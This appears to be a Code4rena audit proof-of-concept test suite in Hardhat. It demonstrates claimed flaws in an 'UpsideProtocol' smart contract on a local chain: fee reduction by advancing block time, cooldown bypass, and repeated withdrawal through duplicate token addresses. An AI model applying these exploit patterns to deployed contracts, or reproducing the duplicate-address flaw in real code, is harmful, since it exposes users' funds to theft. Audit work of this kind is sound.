import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { ethers, network } from "hardhat";
import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from "../types";
import { expect } from "chai";

describe("C4 PoC Test Suite", function () {
  let signers: HardhatEthersSigner[];
  let owner: HardhatEthersSigner;
  let user: HardhatEthersSigner;
  let attacker: HardhatEthersSigner;
  let user1: HardhatEthersSigner; 

  let stakingContract: UpsideStakingStub;
  let upsideProtocol: UpsideProtocol;
  let liquidityToken: IERC20Metadata;
  let metaCoin: UpsideMetaCoin;
  let sampleLinkToken: UpsideMetaCoin; 

  before(async function () {
    signers = await ethers.getSigners();
    owner = signers[2];
    user = signers[0];
    attacker = signers[1];
    user1 = signers[3];


    const StakingStub = await ethers.getContractFactory("UpsideStakingStub");
    stakingContract = await StakingStub.connect(owner).deploy(owner.address);
    await stakingContract.connect(owner).setFeeDestinationAddress(owner.address);

    const UpsideProtocolFactory = await ethers.getContractFactory("UpsideProtocol");
    upsideProtocol = await UpsideProtocolFactory.connect(owner).deploy(owner.address);

    const USDCMock = await ethers.getContractFactory("USDCMock");
    liquidityToken = await USDCMock.connect(owner).deploy();

    await upsideProtocol.connect(owner).init(await liquidityToken.getAddress());
    await upsideProtocol.connect(owner).setStakingContractAddress(await stakingContract.getAddress());

    // Create the first token
    await upsideProtocol.connect(owner).tokenize("https://exploit.me", await liquidityToken.getAddress());
    metaCoin = await ethers.getContractAt(
      "UpsideMetaCoin",
      await upsideProtocol.urlToMetaCoinMap("https://exploit.me")
    );

    // Create the second token for the combined test
    await upsideProtocol.connect(owner).tokenize("https://code4rena.com/", await liquidityToken.getAddress());
    sampleLinkToken = await ethers.getContractAt(
      "UpsideMetaCoin",
      await upsideProtocol.urlToMetaCoinMap("https://code4rena.com/")
    );
  });

    it("should allow attacker to minimize swap fee by manipulating time", async function () {
    console.log("Starting time-based fee manipulation test...");
    
    await upsideProtocol.connect(owner).setFeeInfo({
      tokenizeFeeEnabled: true,
      tokenizeFeeDestinationAddress: owner.address,
      swapFeeStartingBp: 9900,
      swapFeeDecayBp: 100,
      swapFeeDecayInterval: 6,
      swapFeeFinalBp: 100,
      swapFeeDeployerBp: 1000,
      swapFeeSellBp: 100,
    });

    await (liquidityToken as any).mint(attacker.address, ethers.parseUnits("1000", 6));
    await liquidityToken.connect(attacker).approve(
      await upsideProtocol.getAddress(),
      ethers.parseUnits("1000", 6)
    );

    const { swapFeeBp: feeBefore } = await upsideProtocol.computeTimeFee(metaCoin.getAddress());
    console.log(`Initial swap fee: ${feeBefore} basis points (99%)`);
    expect(feeBefore).to.equal(9900n);

    console.log("Advancing time by 10 minutes...");
    await ethers.provider.send("evm_increaseTime", [600]);
    await ethers.provider.send("evm_mine");

    const { swapFeeBp: feeAfter } = await upsideProtocol.computeTimeFee(metaCoin.getAddress());
    console.log(`Reduced swap fee: ${feeAfter} basis points (1%)`);
    expect(feeAfter).to.equal(100n);

    const balanceBefore = await metaCoin.balanceOf(attacker.address);
    console.log(`Attacker initial MetaCoin balance: ${ethers.formatUnits(balanceBefore, 18)}`);
    
    console.log("Performing swap with reduced fee...");
    await upsideProtocol.connect(attacker).swap(
      metaCoin.getAddress(), true, ethers.parseUnits("1000", 6), 0, attacker.address
    );
    
    const balanceAfter = await metaCoin.balanceOf(attacker.address);
    console.log(`Attacker final MetaCoin balance: ${ethers.formatUnits(balanceAfter, 18)}`);
    console.log(`Tokens received: ${ethers.formatUnits(balanceAfter - balanceBefore, 18)}`);

    // ethers v6: balanceOf returns BigInt, use subtraction, not .sub()
    expect(balanceAfter - balanceBefore).to.be.gt(ethers.parseUnits("90000", 18));
    console.log("Exploit successful! Attacker received >90,000 tokens due to fee manipulation");
  });

  
  it("should demonstrate withdrawal cooldown manipulation", async function() {
    console.log("Starting combined vulnerability demonstration...");
    
    // First start the withdrawal timer
    console.log("Initiating withdrawal timer...");
    await upsideProtocol.connect(owner).withdrawLiquidity([]);
    
    // Check timer started
    const startTime = await upsideProtocol.withdrawLiquidityTimerStartTime();
    console.log("Withdrawal timer started at:", startTime.toString());

    // Try to withdraw immediately (should fail)
    console.log("Attempting immediate withdrawal (should fail)...");
    await expect(
      upsideProtocol.connect(owner).withdrawLiquidity([await sampleLinkToken.getAddress()])
    ).to.be.revertedWithCustomError(upsideProtocol, "CooldownTimerNotEnded");
    console.log("Withdrawal correctly failed due to cooldown period");

    // Manipulate block.timestamp to just past cooldown
    const cooldownPeriod = 14*24*60*60;
    console.log(`Fast forwarding time by ${cooldownPeriod} seconds (14 days)...`);
    await network.provider.send("evm_setNextBlockTimestamp", [Number(startTime) + cooldownPeriod + 1]);
    await network.provider.send("evm_mine");
    console.log("Time manipulation complete");

    // Now we can withdraw, and the array validation doesn't prevent duplicates
    console.log("Attempting withdrawal with duplicated addresses...");
    await upsideProtocol.connect(owner).withdrawLiquidity(
      Array(10).fill(await sampleLinkToken.getAddress()) // Same address repeated 10 times
    );
    console.log("Withdrawal successful with duplicated addresses!");
    
    // Set initial fee parameters
    console.log("Setting up fee structure for time manipulation...");
    const initialFeeInfo = {
      tokenizeFeeEnabled: true,
      tokenizeFeeDestinationAddress: owner.address,
      swapFeeStartingBp: 9900, // 99%
      swapFeeDecayBp: 100,     // 1% 
      swapFeeDecayInterval: 6, // 6 seconds
      swapFeeFinalBp: 100,     // 1%
      swapFeeDeployerBp: 1000, // 10%
      swapFeeSellBp: 100,      // 1%
    };

    await upsideProtocol.connect(owner).setFeeInfo(initialFeeInfo);

    // First buyer provides 1000 USDC
    console.log("Minting and approving USDC for swap...");
    await (liquidityToken as any).mint(user1.address, ethers.parseUnits("1000", 6));
    await liquidityToken.connect(user1).approve(
      await upsideProtocol.getAddress(), 
      ethers.parseUnits("1000", 6)
    );

    // Get initial time fee
    const initialFee = await upsideProtocol.computeTimeFee(sampleLinkToken.getAddress());
    console.log("Initial swap fee:", initialFee.swapFeeBp.toString(), "bp");

    // Manipulate block.timestamp
    console.log("Advancing time by 10 minutes to reduce fees...");
    await network.provider.send("evm_increaseTime", [600]); // Jump 10 minutes
    await network.provider.send("evm_mine");

    // Get manipulated time fee  
    const manipulatedFee = await upsideProtocol.computeTimeFee(sampleLinkToken.getAddress());
    console.log("Manipulated swap fee:", manipulatedFee.swapFeeBp.toString(), "bp");
    
    // Attacker buys tokens with reduced fees
    console.log("Executing swap with reduced fees...");
    const swapResult = await upsideProtocol.connect(user1).swap.staticCall(
      sampleLinkToken.getAddress(),
      true, // buy
      ethers.parseUnits("1000", 6),
      0,
      user1.address
    );

    // Execute actual swap
    await upsideProtocol.connect(user1).swap(
      sampleLinkToken.getAddress(), 
      true,
      ethers.parseUnits("1000", 6),
      0,
      user1.address
    );

    console.log("Tokens received:", ethers.formatUnits(swapResult, 18));
    console.log("Combined exploitation complete!");
  });

  it("should allow bypass of withdrawal cooldown by manipulating time", async function () {
    console.log("Starting withdrawal cooldown bypass test...");
    
    await upsideProtocol.connect(owner).withdrawLiquidity([]);
    console.log("Withdrawal timer started");

    const startTime = await upsideProtocol.withdrawLiquidityTimerStartTime();
    console.log(`Cooldown timer initiated at timestamp: ${startTime}`);
    
    console.log("Attempting withdrawal before cooldown ends (should fail)...");
    await expect(
      upsideProtocol.connect(owner).withdrawLiquidity([await metaCoin.getAddress()])
    ).to.be.revertedWithCustomError(upsideProtocol, "CooldownTimerNotEnded");
    console.log("Withdrawal correctly failed due to active cooldown");

    // startTime is BigInt in ethers v6
    const COOLDOWN = 14 * 24 * 60 * 60;
    console.log(`Manipulating time to skip ${COOLDOWN} seconds (14 days)...`);
    await ethers.provider.send("evm_setNextBlockTimestamp", [Number(startTime) + COOLDOWN + 1]);
    await ethers.provider.send("evm_mine");
    console.log("Time manipulation complete");

    console.log("Attempting withdrawal after time manipulation...");
    await expect(
      upsideProtocol.connect(owner).withdrawLiquidity([await metaCoin.getAddress()])
    ).to.not.be.reverted;
    console.log("Withdrawal succeeded after cooldown bypass!");
  });

  it("should allow repeated withdrawal for the same MetaCoin via duplicate addresses", async function () {
    console.log("Starting duplicate address withdrawal test...");
    
    await upsideProtocol.connect(owner).withdrawLiquidity([]);
    console.log("Withdrawal timer initiated");
    
    const startTime = await upsideProtocol.withdrawLiquidityTimerStartTime();
    const COOLDOWN = 14 * 24 * 60 * 60;
    console.log(`Fast forwarding time by ${COOLDOWN} seconds (14 days)...`);
    await ethers.provider.send("evm_setNextBlockTimestamp", [Number(startTime) + COOLDOWN + 1]);
    await ethers.provider.send("evm_mine");
    console.log("Time advancement complete");

    const metaCoinAddr = await metaCoin.getAddress();
    console.log(`Creating array with MetaCoin address ${metaCoinAddr} repeated 5 times`);
    const repeatedArray = Array(5).fill(metaCoinAddr);

    console.log("Attempting withdrawal with repeated addresses...");
    await expect(
      upsideProtocol.connect(owner).withdrawLiquidity(repeatedArray)
    ).to.not.be.reverted;
    console.log("Multiple withdrawals of the same token succeeded!");
  });

  it("should revert with division by zero if swapFeeDecayInterval is set to zero", async function () {
    console.log("Testing fee validation logic...");
    
    console.log("Attempting to set swapFeeDecayInterval to zero (should fail)...");
    await expect(
      upsideProtocol.connect(owner).setFeeInfo({
        tokenizeFeeEnabled: true,
        tokenizeFeeDestinationAddress: owner.address,
        swapFeeStartingBp: 9900,
        swapFeeDecayBp: 100,
        swapFeeDecayInterval: 0,
        swapFeeFinalBp: 100,
        swapFeeDeployerBp: 1000,
        swapFeeSellBp: 100,
      })
    ).to.be.revertedWithCustomError(upsideProtocol, "InvalidSetting");
    console.log("Fee setting correctly reverted with division by zero protection");
  });
});